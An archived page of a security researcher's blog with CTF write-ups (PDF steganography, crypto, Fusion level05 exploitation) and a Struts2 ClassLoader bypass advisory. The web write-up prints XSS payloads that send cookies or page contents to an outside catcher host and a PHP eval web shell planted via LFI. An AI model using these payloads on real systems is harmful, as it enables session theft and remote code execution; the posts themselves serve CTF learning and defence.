

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>&lt;/pwntester&gt; - Page 3</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/page/3/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="prev" href="http://www.pwntester.com/page/2/">
    <link rel="next" href="http://www.pwntester.com/page/4/">
    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="paged archive-template">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        


<article class="post tag-stegano tag-pdf">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-04-27">27 Apr 2014</time> on <a href="../../tag/stegano/">stegano</a>, <a href="../../tag/pdf/">pdf</a></span>
        <h1 class="post-title"><a href="../../blog/2014/04/27/dragonsector-pdf-stegano-50/">DragonSector PDF Stegano 50</a></h1>
    </header>
    <section class="post-content">
        <p>This was the task that most player solved (89). We were given a PDF with a Lorem ipsum text. Using PeePDF from <a href="https://twitter.com/EternalTodo">@EternalTodo</a> we can easily analyze the PDF.</p>

<p>The <code>info</code> command shows two suspicious sectors:</p>

<p><img src="../../content/images/octopress/dsctf-21.png" alt=""></p>

<p>But the <code>metadata</code> one shows more interesting stuff:</p>

<p><img src="../../content/images/octopress/dsctf-22.png" alt=""></p>

<p>It seems there may be a morse code hidden in the PDF. Looking around different PFD objects we see something interesting in object 8:</p>

<p><img src="../../content/images/octopress/dsctf-23.png" alt=""></p>

<p>If we treat A's and B's as dots and dashes we get the following texts:</p>

<pre><code class="language-lang-bash line-numbers ">BABA BBB B A BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AA AAA AAAAA AAAAB BBA AAABB

.-.- ... . - ..- -.- -. . --. -.-- -. . -- ... .- --- ..--.. --.- -.-- -. ..- ...--- -.... .- ---. -.... ----- -.... .--- -.-- ---.. .. ---.. -- --- ----- ----. ..- ---..
?SETUKNEGYNEMSAO?QYNU?6A?606JY8I8MO09U8
-.-. --- - . --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- .. ... ..... ....- --. ...--
COTEGRATULATIONS,FLAG:1NV151BL3M3IS54G3  
</code></pre>

<p>There is something wrong with my decoding since CONGRATULATIONS is decoded as COTEGRATULATIONS, but the flag looks ok except for the extra 'I' and 'S' that turned out to be another '5'. So the flag was:</p>

<p><code>1NV151BL3M3554G3</code></p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/04/27/dragonsector-pdf-stegano-50/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-post-tag">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-04-24">24 Apr 2014</time> on <a href="../../tag/post-tag/">post</a></span>
        <h1 class="post-title"><a href="../../blog/2014/04/24/struts2-0day-in-the-wild/">Struts2 0day in the wild</a></h1>
    </header>
    <section class="post-content">
        <h3 id="remotecodeexecution0dayinuptodatestruts2applications">Remote code execution 0 day in up-to-date Struts 2 applications:</h3>

<p>Some months ago Struts2 announced a security vulnerability  <a href="http://struts.apache.org/release/2.3.x/docs/s2-020.html">S2-020</a> that allowed ClassLoader manipulation and that could be used to get Remote Code Execution on certain application servers like Tomcat 8. The <a href="https://github.com/apache/struts/commit/aaf5a3010e3c11ae14e3d3c966a53ebab67146be">fix</a> for this vulnerability was to forbid the <code>(.*\.|^)class\..*</code> regex from action parameters. However a <a href="http://blog.vulnhunt.com/index.php/2014/04/24/apache_struts2_0day/">bypass</a> was made public that basically consists in changing the dot notation for the square bracket notation. So instead of using <code>class.classloader</code> to access the classloader, the bypass used <code>class['classLoader']</code>. I just verified the bypass on my local PoC with latest Struts version (2.3.16.1) and I was able to pop up an evil calc. Also it is possible to bypass the original regex by using <code>Class.classloader</code> (with capital 'C').</p>

<h4 id="remediation">Remediation:</h4>

<p>While Struts2 releases a fix, please update your <code>excludeParams</code> regex to account for the opening square bracket and capital 'C':</p>

<p><code>(.*\.|^)(class|Class)(\.|\[).*</code></p>

<p><strong>Update:</strong>
After talking with Struts2 security team, they confirmed they are working on the patch and the regex to be released will be: <br>
<code>(.*\.|^|.*|\[('|"))(c|C)lass(\.|('|")]|\[).*</code></p>

<p>The easiest way is to modify your struts config file and add:</p>

<pre><code class="language-lang-bash line-numbers ">&lt;struts&gt;  
...
...
    &lt;package name="default" namespace="/" extends="struts-default"&gt;
        &lt;interceptors&gt;
            &lt;interceptor-stack name="secureParamInterceptor"&gt;
                &lt;interceptor-ref name="defaultStack"&gt;
                    &lt;param name="params.excludeParams"&gt;(.*\.|^|.*|\[('|"))(c|C)lass(\.|('|")]|\[).*,^dojo\..*,^struts\..*,^session\..*,^request\..*,^application\..*,^servlet(Request|Response)\..*,^parameters\..*,^action:.*,^method:.*&lt;/param&gt;
                &lt;/interceptor-ref&gt;
            &lt;/interceptor-stack&gt;
        &lt;/interceptors&gt;

        &lt;default-interceptor-ref name="secureParamInterceptor" /&gt;
        ...
        ...
    &lt;/package&gt;
...
...
&lt;/struts&gt;  
</code></pre>

<p>Stay secure!</p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/04/24/struts2-0day-in-the-wild/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-post-tag">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-04-20">20 Apr 2014</time> on <a href="../../tag/post-tag/">post</a></span>
        <h1 class="post-title"><a href="../../blog/2014/04/20/crowd-solving-fusion-level05/">Crowd-Solving Fusion level05</a></h1>
    </header>
    <section class="post-content">
        <p>I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn't find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from <a href="https://twitter.com/Newlog_">@Newlog_</a> got me thinking it could be a good idea to post what I've done so far in case anyone wants to pick it from there and help solving the level. Lets call this crowd-solving :-D</p>

<p>So lets get the ball rolling:</p>

<p>In <a href="http://exploit-exercises.com/fusion/level05">level05</a> we are given the following server code:</p>

<pre><code class="language-lang-clike line-numbers ">#include "../common/common.c"

#include &lt;task.h&gt;

#define STACK (4096 * 8)

unsigned int hash(unsigned char *str, int length, unsigned int mask)  
{
  unsigned int h = 0xfee13117;
  int i;

  for(h = 0xfee13117, i = 0; i &lt; length; i++) {
    h ^= str[i];
    h += (h &lt;&lt; 11);
    h ^= (h &gt;&gt; 7);
    h -= str[i];
  }
  h += (h &lt;&lt; 3);
  h ^= (h &gt;&gt; 10);
  h += (h &lt;&lt; 15);
  h -= (h &gt;&gt; 17);

  return (h &amp; mask);
}

void fdprintf(int fd, char *fmt, ...)  
{
  va_list ap;
  char *msg = NULL;

  va_start(ap, fmt);
  vasprintf(&amp;msg, fmt, ap);
  va_end(ap);

  if(msg) {
    fdwrite(fd, msg, strlen(msg));
    free(msg);
  }
}

struct registrations {  
  short int flags;
  in_addr_t ipv4;
} __attribute__((packed));

#define REGDB (128)
struct registrations registrations[REGDB];

static void addreg(void *arg)  
{
  char *name, *sflags, *ipv4, *p;
  int h, flags;
  char *line = (char *)(arg);

  name = line;
  p = strchr(line, ' ');
  if(! p) goto bail;
  *p++ = 0;
  sflags = p;
  p = strchr(p, ' ');
  if(! p) goto bail;
  *p++ = 0;
  ipv4 = p;

  flags = atoi(sflags);
  if(flags &amp; ~0xe0) goto bail;

  h = hash(name, strlen(name), REGDB-1);
  registrations[h].flags = flags;
   registrations[h].ipv4 = inet_addr(ipv4);

  printf("registration added successfully\n");

bail:  
  free(line);
}

static void senddb(void *arg)  
{
  unsigned char buffer[512], *p;
  char *host, *l;
  char *line = (char *)(arg);
  int port;
  int fd;
  int i;
  int sz;

  p = buffer;
  sz = sizeof(buffer);
  host = line;
  l = strchr(line, ' ');
  if(! l) goto bail;
  *l++ = 0;
  port = atoi(l);
  if(port == 0) goto bail;

  printf("sending db\n");

  if((fd = netdial(UDP, host, port)) &lt; 0) goto bail;

  for(sz = 0, p = buffer, i = 0; i &lt; REGDB; i++) {
    if(registrations[i].flags | registrations[i].ipv4) {
      memcpy(p, &amp;registrations[i], sizeof(struct registrations));
      p += sizeof(struct registrations);
      sz += sizeof(struct registrations);
    }
  }
bail:  
  fdwrite(fd, buffer, sz);
  close(fd);
  free(line);
}

int get_and_hash(int maxsz, char *string, char separator)  
{
  char name[32];
  int i;

  if(maxsz &gt; 32) return 0;

  for(i = 0; i &lt; maxsz, string[i]; i++) {
    if(string[i] == separator) break;
    name[i] = string[i];
  }

  return hash(name, strlen(name), 0x7f);
}


struct isuparg {  
  int fd;
  char *string;
};


static void checkname(void *arg)  
{
  struct isuparg *isa = (struct isuparg *)(arg);
  int h;

  h = get_and_hash(32, isa-&gt;string, '@');

  fdprintf(isa-&gt;fd, "%s is %sindexed already\n", isa-&gt;string, registrations[h].ipv4 ? "" : "not ");

}

static void isup(void *arg)  
{
  unsigned char buffer[512], *p;
  char *host, *l;
  struct isuparg *isa = (struct isuparg *)(arg);
  int port;
  int fd;
  int i;
  int sz;

  // skip over first arg, get port
  l = strchr(isa-&gt;string, ' ');
  if(! l) return;
  *l++ = 0;

  port = atoi(l);
  host = malloc(64);

  for(i = 0; i &lt; 128; i++) {
    p = (unsigned char *)(&amp; registrations[i]);
    if(! registrations[i].ipv4) continue;

    sprintf(host, "%d.%d.%d.%d",
      (registrations[i].ipv4 &gt;&gt; 0) &amp; 0xff,
      (registrations[i].ipv4 &gt;&gt; 8) &amp; 0xff,
      (registrations[i].ipv4 &gt;&gt; 16) &amp; 0xff,
      (registrations[i].ipv4 &gt;&gt; 24) &amp; 0xff);

    if((fd = netdial(UDP, host, port)) &lt; 0) {
      continue;
    }

    buffer[0] = 0xc0;
    memcpy(buffer + 1, p, sizeof(struct registrations));
    buffer[5] = buffer[6] = buffer[7] = 0;

    fdwrite(fd, buffer, 8);

    close(fd);
  }

  free(host);
}

static void childtask(void *arg)  
{
  int cfd = (int)(arg);
  char buffer[512], *n;
  int r;


  n = "** welcome to level05 **\n";

  if(fdwrite(cfd, n, strlen(n)) &lt; 0) goto bail;

  while(1) {
    if((r = fdread(cfd, buffer, 512)) &lt;= 0) goto bail;

    n = strchr(buffer, '\r');
    if(n) *n = 0;
    n = strchr(buffer, '\n');
    if(n) *n = 0;

    if(strncmp(buffer, "addreg ", 7) == 0) {
      taskcreate(addreg, strdup(buffer + 7), STACK);
      continue;
    }

    if(strncmp(buffer, "senddb ", 7) == 0) {
      taskcreate(senddb, strdup(buffer + 7), STACK);
      continue;
    }

    if(strncmp(buffer, "checkname ", 10) == 0) {
      struct isuparg *isa = calloc(sizeof(struct isuparg), 1);

      isa-&gt;fd = cfd;
      isa-&gt;string = strdup(buffer + 10);

      taskcreate(checkname, isa, STACK);
      continue;
    }

    if(strncmp(buffer, "quit", 4) == 0) {
      break;
    }

    if(strncmp(buffer, "isup ", 5) == 0) {
      struct isuparg *isa = calloc(sizeof(struct isuparg), 1);
      isa-&gt;fd = cfd;
      isa-&gt;string = strdup(buffer + 5);
      taskcreate(isup, isa, STACK);
    }
  }

bail:  
  close(cfd);
}

void taskmain(int argc, char **argv)  
{
  int fd, cfd;
  char remote[16];
  int rport;

  signal(SIGPIPE, SIG_IGN);
  background_process(NAME, UID, GID);

  if((fd = netannounce(TCP, 0, PORT)) &lt; 0) {
    fprintf(stderr, "failure on port %d: %s\n", PORT, strerror(errno));
    taskexitall(1);
  }

  fdnoblock(fd);

  while((cfd = netaccept(fd, remote, &amp;rport)) &gt;= 0) {
    fprintf(stderr, "accepted connection from %s:%d\n", remote, rport);
    taskcreate(childtask, (void *)(cfd), STACK);
  }



}
</code></pre>

<p>The server takes different commands as input:</p>

<ul>
<li>addreg [name] [flags] [ip]: Register an IP with a given flags (32,96 or 224) and store it in an array with an index provided by a custom hash function of the given name</li>
<li>senddb [ip] [port]: Sends all the registered IPs to the given ip and port using UDP</li>
<li>isup [skipped] [port]: Loop through all the ips registered and for those with a valid ip, it sends the details to that ip and the provided port</li>
<li>checkname [name]: Calculate the custom hash of the given name and checks if the registration array contains a valid ip for that hash</li>
<li>quit: Exit</li>
</ul>

<p>There are a couple of overflows that we can abuse:</p>

<p>The first one is on <code>get_and_hash</code>  "for" loop:</p>

<pre><code class="language-lang-clike line-numbers ">for(i = 0; i &lt; maxsz, string[i]; i++) {  
  if(string[i] == separator) break;
   name[i] = string[i];
}
</code></pre>

<p>The loop wont stop at <code>maxsz</code> allowing writing beyond the limits of the "name" buffer (32). We can quickly verify this using <strong>metasploit</strong> to find the right overflow offet:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~$ /opt/metasploit-framework/tools/pattern_create.rb 64  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~$ nc localhost 20005  
** welcome to level05 **
checkname Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A  
</code></pre>

<p>Monitoring the process with gdb we get:</p>

<pre><code class="language-lang-bash line-numbers ">(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.  
0x35624134 in ?? ()  
</code></pre>

<p>That corresponds to offset 44:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~$ /opt/metasploit-framework/tools/pattern_offset.rb 35624134  
44  
</code></pre>

<p>This allows us to write beyond "name" buffer limits and into the stored base pointer and instruction pointer. Actually looks like a nice place to place our payload:</p>

<pre><code class="language-lang-bash line-numbers ">(gdb) x/100wx $esp
0xb940cc6c:    0x44444444  0x42424242  0x42424242  0x42424242  
0xb940cc7c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cc8c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cc9c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccac:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccbc:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cccc:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccdc:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccec:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccfc:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cd0c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cd1c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cd2c:    0x42424242  0x42424242  0x42424242  0x00000000  
</code></pre>

<p>There is another overflow that we cannot exploit since there is a call to <code>free(line)</code> before returning from the function that crash the application. This one is in the <code>senddb</code> function:</p>

<pre><code class="language-lang-bash line-numbers ">unsigned char buffer[512], *p;  
..
..
for(sz = 0, p = buffer, i = 0; i &lt; REGDB; i++) {  
  if(registrations[i].flags | registrations[i].ipv4) {
    memcpy(p, &amp;registrations[i], sizeof(struct registrations));
    p += sizeof(struct registrations);
    sz += sizeof(struct registrations);
  }
}
bail:  
  fdwrite(fd, buffer, sz);
  close(fd);
  free(line);
</code></pre>

<p><code>buffer</code> is 512 bytes long but we can overwrite it with 128 (REGDB) registrations which are 6 bytes long each. So with 85 of them we can overwrite the destination buffer.
The problem is that <code>line</code> will also be affected and the call to <code>free(line)</code> will segfault before getting to <code>ret</code></p>

<p>This was one of the first vectors I tried to use to leak the binary base address since we can overwrite some registers before crashing that could leak the base address plus a fixed offset. However there is no difference in the application behaviour that we can use to know if we overwrote those register bytes with the right values or not (as we did for <a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">level04</a>)</p>

<p>Anyway if someone wants to give it a try they will first need to set up a listener for the info coming from the <code>senddb</code> fdwrite function. I wrote this listener that works on port 6666/UDP and that works for <code>senddb</code> and <code>isup</code> commands:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python

from socket import *  
from struct import *

s = socket(AF_INET, SOCK_DGRAM)  
s.bind(('0.0.0.0', 6666))  
while True:  
    data =  s.recv(1024)
    print("[+] Received UDP packet with length {0}: {1}".format(len(data), data.encode("hex")))
    if data[:1].encode("hex") == "c0":
        print("[+] Received ISUP packet {0}".format(data.encode("hex")))
        print("[+]   Control char: " + data[:1].encode("hex"))
        flags = unpack("&lt;H", data[1:3])[0]
        print("[+]   Flags: {0}".format(int(flags),16))
        # Not printing the ip since we miss a byte and since it will always be our own ip otherwise we could not receive it
        #reg = unpack("&lt;I", data[3:7])[0]
        #print("[+]   3 bytes from address: {0}".format(reg))
    else:
        i = 0
        print("[+] Received SENDDB packet with {0} registrations".format(len(data)/6))
        while i &lt; len(data):
                reg = data[i:i+6]
                print("[+] Received SENDDB packet {0}".format(reg.encode("hex")))
                flags = unpack("&lt;H", reg[0:2])[0]
                print("[+]   Flags: {0}".format(int(flags),16))
                host = unpack("&lt;I", reg[2:6])[0]
                print("[+]   Host ({2}) IP: {0} ({1})".format(inet_ntoa(reg[2:6]),reg[2:6].encode("hex"),(i+6)/6))
                i += 6
</code></pre>

<p>Using this listener and the following bruteforce client script, we can find which names generate the right hashes to overwrite ebp, ebx, eip ...</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python

from socket import *  
from struct import *

s = socket(AF_INET, SOCK_STREAM)  
s.connect(("localhost", 20005))  
for i in xrange(139):  
        if i == 84:
                # EBP
                payload = "addreg {0} 32 {1}\n".format(i,inet_ntoa("\x44\x44\x44\x44"))
        elif i == 50:
                # EBX
                payload = "addreg {0} 32 {1}\n".format(i,inet_ntoa("\x41\x41\x41\x41"))
        else:
                payload = "addreg {0} 32 127.0.0.{0}\n".format(i)
        s.send(payload)
s.send("senddb 127.0.0.1 6666\n")  
s.close()  
</code></pre>

<p>Running the script will get us the following packets in our listener:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~$ python fusion05-senddb.py  
..
..
[+]   Host (86) IP: 127.0.0.70 (7f000046)
[+]   Host (87) IP: 127.0.0.69 (7f000045)
[+]   Host (88) IP: 127.0.0.137 (7f000089)
[+]   Host (89) IP: 65.65.65.65 (41414141)
[+]   Host (90) IP: 127.0.0.87 (7f000057)
[+]   Host (91) IP: 68.68.68.68 (44444444)
</code></pre>

<p>It turns out that we need 139 different "names" to produce 91 unique hashes that are the ones required to overflow the buffer (not 85 as we calculated) <br>
The problem is that the 91 registration also overwrites the argument to <code>free(line)</code> as shown in GDB right before calling <code>free()</code></p>

<p>In the first overflow (the <code>get_and_hash()</code> one), we overwrite <code>esi</code> and <code>edi</code> which change on every request before overwriting <code>ebp</code> and <code>eip</code>. Overwriting <code>ebp</code> byte a byte can leak the binary load offset but in order to do so we have to overwrite <code>esi</code> with an address with write permissions (since "checkname" contains the following instruction after leaving <code>get_and_hash</code>: <code>&lt;checkname+107&gt;: mov (%esi),%eax</code>) and even guessing a good one, overwriting <code>ebp</code> does not change the server behaviour to make educated guesses about the right <code>ebp</code> value. So this looks like a dead end for my newbie skills.</p>

<p>So here I am stucked, any ideas?</p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/04/20/crowd-solving-fusion-level05/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-ctf tag-crypto tag-caesar tag-xor tag-xortool">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-04-06">06 Apr 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/crypto/">Crypto</a>, <a href="../../tag/caesar/">Caesar</a>, <a href="../../tag/xor/">xor</a>, <a href="../../tag/xortool/">xortool</a></span>
        <h1 class="post-title"><a href="../../blog/2014/04/06/nuitduhack-2014-crypto-write-ups/">NuitDuHack 2014 Crypto Write Ups</a></h1>
    </header>
    <section class="post-content">
        <h1 id="carbonara">Carbonara</h1>

<p>We are given the following ciphertext:</p>

<p><code>%96 7=28 7@C E9:D 492= :D iQx&gt;A6C2E@C xF=:FD r26D2C s:GFDQ]</code></p>

<p>A simple shift shows interesting results:</p>

<pre><code class="language-lang-python line-numbers ">ciphertext = "%96 7=28 7@C E9:D 492= :D iQx&gt;A6C2E@C xF=:FD r26D2C s:GFDQ]"  
size = len(ciphertext)  
for i in range(0,100):  
    result=""
    for c in ciphertext:
        if ord(c) &gt; 126 or ord(c) &lt; 33:
            result += c
        else:
            first = ord(c)+i
            if first &gt; 90:
                first = 64 + (first - 90)
            result += chr(first)
    print(result)
</code></pre>

<p><img src="../../content/images/octopress/ndh_20.png" alt=""></p>

<p>Here is were the history classes prove valuable, flag is:</p>

<p><code>Imperator Iulius Caesar Divus</code></p>

<h1 id="worthless">Worthless</h1>

<p>We are given a bunch of 0's and 1's.</p>

<pre><code class="language-lang-bash line-numbers ">00010111000001110001010001100011 00001001000111010000001000001000 01110001000001010000000000000011  
01100011000110110001100100001010 00011100011100010000000000000111 00010000000011110110111100011000  
00010000011011110001011100001111 00000000000100100000000000000110 00011111000000100001101000010010  
00001010000000010001100000001011 00000110000111010000101000011111 00011000000011110000011000010111  
00001010000011000001000000010111 00000110000111100000110101100001  
</code></pre>

<p>If we group them by bytes we get a 56 length binary. Our favorite xor key guessing tool: <a href="https://github.com/hellman/xortool">xortool</a> by Hellman shows that a key of length 3n is possible. However it fails decrypting the message with " " (supposing it is a text) as the most frequent char. That is normal in such short texts. The idea to solve it is to pass all characters as most frequent chars for the analysis and then grep the results for words you may be expecting such "flag".</p>

<pre><code class="language-lang-python line-numbers ">from xortool.xortool import process  
import os

def search(text):  
    rootdir = './xortool_out'
    for subdir, dirs, files in os.walk(rootdir):
        for file in files:
            if ".out" in file:
                f = open(os.path.join(subdir,file),'r')
                contents = f.read()
                if text in contents:
                    print "\"%s\" found at %s: %s" % (text, os.path.join(subdir,file), contents,)

original = "0001011100000111000101000110001100001001000111010000001000001000011100010000010100000000000000110110001100011011000110010000101000011100011100010000000000000111000100000000111101101111000110000001000001101111000101110000111100000000000100100000000000000110000111110000001000011010000100100000101000000001000110000000101100000110000111010000101000011111000110000000111100000110000101110000101000001100000100000001011100000110000111100000110101100001"  
bytes = []  
for i in range(0,len(original),8):  
    test = hex(int(original[i:i+8], 2))
    bytes.append(test[2:].zfill(2))
ciphertext = ''.join(bytes).decode('hex')


# try lower letters as most frequest chars
process(ciphertext, [i for i in range(97,122)])  
search("lag")

# try upper letters as most frequest chars
process(ciphertext, [i for i in range(65,90)])  
search("LAG")  
</code></pre>

<p>The result of running the script:</p>

<p><img src="../../content/images/octopress/ndh_21.png" alt=""></p>

<p>Voila!</p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/04/06/nuitduhack-2014-crypto-write-ups/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-ctf tag-xss tag-web tag-php tag-lfi">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-04-06">06 Apr 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/xss/">XSS</a>, <a href="../../tag/web/">Web</a>, <a href="../../tag/php/">PHP</a>, <a href="../../tag/lfi/">LFI</a></span>
        <h1 class="post-title"><a href="../../blog/2014/04/06/nuitduhack-2014-web-write-ups/">NuitDuHack 2014 Web Write Ups</a></h1>
    </header>
    <section class="post-content">
        <h1 id="web100abitol">Web 100: Abitol</h1>

<p>This is a simple web app where you can register and login to see an articles page, a photo gallery, a flag page and an admin contact page.</p>

<p>Visiting the flag page give us a <code>Nice try, did you really think it would be that easy? ;)</code> but the photo gallery is vulnerable to XSS:</p>

<p><code>http://abitbol.nuitduhack.com/zoom.php?image=1%3E%3Cscript%3Ealert%281%29%3C/script%3E</code></p>

<p><img src="../../content/images/octopress/ndh_1.png" alt=""></p>

<p>Now, we dont know how the admin contact will be visualized in the viewer page, but we can try to send him a message with an iframe pointing to the vulnerable page so we can send his session ID to our cookie catcher or use XHR to request the flag.php page and send us the flag. Both options work, but the second is slighlty better since the time frame where the session ID is valid is very narrow:</p>

<pre><code class="language-lang-bash line-numbers ">&lt;iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg&gt;&lt;script&gt;flag = new XMLHttpRequest(); flag.open('GET','/flag.php',false); flag.send(); flag.open('GET','http://ctf.pwntester.com/catcher.php?data='+flag.response); flag.send();&lt;/script&gt;" /&gt;  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">&lt;iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg&gt;&lt;script&gt;document.location="http://ctf.pwntest.com/catcher.php?data="+document.cookie&lt;/script&gt;" /&gt;  
</code></pre>

<p>After waiting a few minutes, the flag is waiting for us in the catcher:</p>

<p><img src="../../content/images/octopress/ndh_2.png" alt=""></p>

<h1 id="web300titanoreine">Web 300: Titanoreine</h1>

<p>This is a photo gallery where we can upload any image to the site. That seems the first attack vector, the second one is that it allows you to change the language and the parameter to do that is <code>lang=(eng|fr).php</code> which looks vulnerable to LFI. After some trials, you can include any local file in the root directory by going down three levels. Eg:  <code>../../../upload.php</code></p>

<p><img src="../../content/images/octopress/ndh_3.png" alt=""></p>

<p>If we include the default images in the gallery system, we can see that only <code>2.jpg</code> is included as binary garbage in the page:</p>

<p><img src="../../content/images/octopress/ndh_4.png" alt=""></p>

<p>However if we download the original image and upload it again with a different name, the new image cannot be included and the LFI just show an empty page. So there seems to be some kind of conversion going on. Comparing the EXIF data of the original and converted ones, we can see that is being compressed by gd library with quality 98:</p>

<p><img src="../../content/images/octopress/ndh_5.png" alt=""></p>

<p>We will compress it locally so that it does not suffer any conversion in the server (actually the server still changes the image, but probability of screwing up the php code are smaller):</p>

<pre><code class="language-lang-php line-numbers ">$image = imagecreatefromjpeg('avatar.jpg');
imagejpeg($image,'avatar_lq.jpg',98);  
</code></pre>

<p>Uploading the new compressed image to the site and including it via the LFI works now. All we have to do now is include a PHP shell. It turns out that many PHP commands seems to be forbidden by the server so we ended up using eval: <code>&lt;?php eval($_GET['a']); ?&gt;</code></p>

<p>Update: During the CTF, we were lucky to find another team JPG so that we could slightly modufy it and use it. Modifying a JPG so that the changes survide a GD compression is not an easy task, but will try to explain in a following post.</p>

<p>With that in place we can start sending commands to the server. First we can exfiltrate the code using <code>highlight_file()</code>:</p>

<p><code>index.php</code>
<img src="../../content/images/octopress/ndh_7.png" alt=""></p>

<p><code>functions.php</code>
<img src="../../content/images/octopress/ndh_8.png" alt=""></p>

<p><code>upload.php</code>
